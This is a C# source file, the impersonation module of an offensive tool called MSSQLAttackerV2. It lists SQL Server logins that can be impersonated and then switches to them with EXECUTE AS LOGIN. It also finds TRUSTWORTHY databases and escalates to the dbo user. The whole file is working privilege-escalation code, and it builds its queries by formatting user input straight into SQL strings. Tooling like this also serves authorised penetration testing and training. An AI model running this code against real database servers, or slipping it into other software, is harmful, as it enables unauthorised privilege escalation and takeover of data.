using System;
using System.Data.SqlClient;
using System.Runtime.InteropServices;




namespace MSSQLAttackerV2.Modules
{
    internal class Impersonate
    {

        public String checkImpersonation(SqlConnection con)
        {
            var runQuery = new RunQuery();
            var helpWrite = new Helpwrite();
            String query = "SELECT distinct b.name FROM sys.server_permissions a INNER JOIN sys.server_principals b ON a.grantor_principal_id = b.principal_id WHERE a.permission_name = 'IMPERSONATE';";
            String impersonatableUsers = helpWrite.getFilteredResult(runQuery.getQueryResult(con, query));
            if (String.IsNullOrEmpty(impersonatableUsers)) { helpWrite.doWrite(0, "Impersonation Not Allowed"); return ""; }
            helpWrite.doWrite(1, "Impersonatable Users: \n" + impersonatableUsers);
            return impersonatableUsers;

        }
        public void impersonate(SqlConnection con, [Optional, DefaultParameterValue(null)] String impersonateUser)
        {
            var runQuery = new RunQuery();
            var helpWrite = new Helpwrite();
            try
            {
                
                while (string.IsNullOrEmpty(impersonateUser))
                {
                    Console.Write("Enter UserName to impersonate:");
                    impersonateUser = Console.ReadLine();
                }
                if (string.IsNullOrEmpty(impersonateUser)) { return; };
                String executeas = String.Format("EXECUTE AS LOGIN = '{0}';", impersonateUser);
                String temp = runQuery.getQueryResult(con, executeas).ToString();
                helpWrite.doWrite(1, "Impersonation Success [" +impersonateUser+"]");
                return;
            }
            catch (Exception)
            {

                helpWrite.doWrite(0, "Impersonation Failed");
                return;
            }



        }

        public string checkImpersonateDBO(SqlConnection con)
        {
            var runQuery = new RunQuery();
            var helpWrite = new Helpwrite();
            String query = "SELECT name from sys.databases where is_trustworthy_on = 1;";
            String databaseName = helpWrite.getFilteredResult(runQuery.getQueryResult(con, query));
            if (!string.IsNullOrEmpty(databaseName)) { helpWrite.doWrite(1, "Found Trustworthy Database"); return databaseName; }
            return "";

        }
        public void abuseImpersonationDBO(SqlConnection con, [Optional, DefaultParameterValue(null)] String databaseName)
        {
            var runQuery = new RunQuery();
            var helpWrite = new Helpwrite();
            try
            {
                if (string.IsNullOrEmpty(databaseName)) { databaseName = checkImpersonateDBO(con); }
                while (string.IsNullOrEmpty(databaseName))
                {
                    Console.Write("Enter Database Name:");
                    databaseName = Console.ReadLine();
                }

                String executeas = String.Format("use {0}; EXECUTE AS USER = 'dbo';", databaseName);
                String temp = runQuery.getQueryResult(con, executeas).ToString();
                helpWrite.doWrite(1, "Impersonation As DBO Success ");
                return;
            }
            catch (Exception)
            {

                helpWrite.doWrite(0, "Impersonation As DBO Failed!");
                return;
            }


        }
    }
}
